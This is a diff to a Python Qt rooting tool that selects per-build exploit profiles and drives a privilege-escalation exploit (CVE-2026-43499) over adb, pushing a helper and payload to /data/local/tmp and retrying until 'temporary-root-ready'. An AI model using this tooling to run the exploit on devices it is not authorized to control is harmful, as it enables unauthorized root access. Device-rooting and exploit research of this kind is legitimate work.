@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import os
+import json
 import re
 import shutil
 import subprocess
@@ -40,10 +41,14 @@ class RootWindow(QMainWindow):
         self.log_started = False
         self.root_active = False
         assets = Path(__file__).with_name("assets")
-        jni_libs = assets
-        self.helper_path = str(jni_libs / "libcve43499root.so")
-        self.payload_path = str(assets / "cve-2026-43499-app.so")
-        self.ksud_path = str(assets / "ksud-next")
+        self.assets_dir = assets
+        self.profiles_path = assets / "profiles.json"
+        self.profiles = self._load_profiles()
+        self.active_profile: dict[str, str] | None = None
+        legacy = self.profiles[0]
+        self.helper_path = str(assets / legacy["helper"])
+        self.payload_path = str(assets / legacy["payload"])
+        self.ksud_path = str(assets / legacy["ksud"])
         self.device_name = "No device"
         self.elapsed = QElapsedTimer()
         self.run_timer = QTimer(self)
@@ -61,6 +66,49 @@ class RootWindow(QMainWindow):
     @staticmethod
     def _sh_quote(value: str) -> str:
         return "'" + value.replace("'", "'\"'\"'") + "'"
+
+    def _load_profiles(self) -> list[dict[str, str]]:
+        try:
+            with self.profiles_path.open(encoding="utf-8") as stream:
+                data = json.load(stream)
+        except (OSError, json.JSONDecodeError) as error:
+            raise RuntimeError(f"cannot load profile catalog: {error}") from error
+        profiles = data.get("profiles") if isinstance(data, dict) else None
+        if not isinstance(profiles, list) or not profiles:
+            raise RuntimeError("profile catalog is empty")
+        return [profile for profile in profiles if isinstance(profile, dict)]
+
+    def _adb_value(self, serial: str, *command: str) -> str:
+        try:
+            result = subprocess.run(
+                ["adb", "-s", serial, "shell", *command],
+                capture_output=True,
+                text=True,
+                check=False,
+                timeout=10,
+            )
+        except (OSError, subprocess.TimeoutExpired) as error:
+            raise RuntimeError(f"cannot read device properties: {error}") from error
+        if result.returncode != 0:
+            detail = result.stderr.strip() or f"exit {result.returncode}"
+            raise RuntimeError(f"cannot read device properties: {detail}")
+        return result.stdout.strip()
+
+    def _select_profile(self, serial: str) -> dict[str, str]:
+        properties = {
+            "build_display": self._adb_value(serial, "getprop", "ro.build.display.id"),
+            "fingerprint": self._adb_value(serial, "getprop", "ro.build.fingerprint"),
+            "kernel_release": self._adb_value(serial, "uname", "-r"),
+            "kernel_version": self._adb_value(serial, "uname", "-v"),
+        }
+        keys = tuple(properties)
+        for profile in self.profiles:
+            if all(profile.get(key) == properties[key] for key in keys):
+                return profile
+        raise RuntimeError(
+            "unsupported build: "
+            f"{properties['build_display']} / {properties['fingerprint']}"
+        )
 
     def build_root_script(self, serial: str) -> str:
         remote = "/data/local/tmp"
@@ -98,6 +146,10 @@ for i in $(seq 1 "${{MAX_ATTEMPTS:-5}}"); do
     echo "  -> attempt $i/${{MAX_ATTEMPTS:-5}}"
     $ADB shell "mkdir -p $REMOTE && : > $REMOTE/exploit.log"
     $ADB shell "EXPLOIT_ATTEMPTS=1 $REMOTE/ksu-helper --run-payload $REMOTE/ksu-payload $REMOTE/ksu-helper $REMOTE/exploit.log" || true
+    if $ADB shell "grep -q 'stage=privileged-transition-unimplemented' $REMOTE/exploit.log" 2>/dev/null; then
+        echo "[+] Research run completed at the privileged boundary"
+        exit 0
+    fi
     if $ADB shell "grep -q 'stage=temporary-root-ready' $REMOTE/exploit.log" 2>/dev/null; then
         ROOTED=1
         echo "  [+] Temporary root ready on attempt $i"
@@ -551,6 +603,19 @@ fi
         if self.cleanup_process:
             self.cleanup_process.deleteLater()
             self.cleanup_process = None
+        try:
+            self.active_profile = self._select_profile(self.selected_serial)
+        except RuntimeError as error:
+            self.append_output(f"[profile] {error}")
+            self.start_button.setEnabled(True)
+            self.stop_button.setEnabled(False)
+            self.refresh_button.setEnabled(True)
+            self.status.setText("Unsupported build")
+            return
+        self.helper_path = str(self.assets_dir / self.active_profile["helper"])
+        self.payload_path = str(self.assets_dir / self.active_profile["payload"])
+        self.ksud_path = str(self.assets_dir / self.active_profile["ksud"])
+        self.append_output(f"[profile] {self.active_profile['id']}")
         self.elapsed.start()
         self.run_timer.start(1000)
         self.active_time_label.setText("Device uptime · 00:00:00")
